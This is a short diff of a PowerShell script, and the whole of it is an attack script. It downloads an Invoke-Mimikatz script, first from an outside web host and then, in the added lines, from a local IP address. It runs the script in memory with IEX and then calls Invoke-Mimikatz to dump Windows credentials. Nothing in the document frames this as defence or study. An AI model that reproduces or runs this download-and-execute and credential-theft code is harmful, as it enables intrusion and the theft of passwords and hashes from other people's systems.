@@ -9,3 +9,12 @@ $browser = New-Object System.Net.WebClient
 $file="https://sf-res.com/Invoke-mimi.ps1"
 IEX($browser.DownloadString($file))
 Invoke-Mimikatz
+
+
+
+
+
+$browser = New-Object System.Net.WebClient
+$file="http://192.168.0.3:8000/Invoke-Mimikatz.ps1"
+IEX($browser.DownloadString($file))
+Invoke-Mimikatz
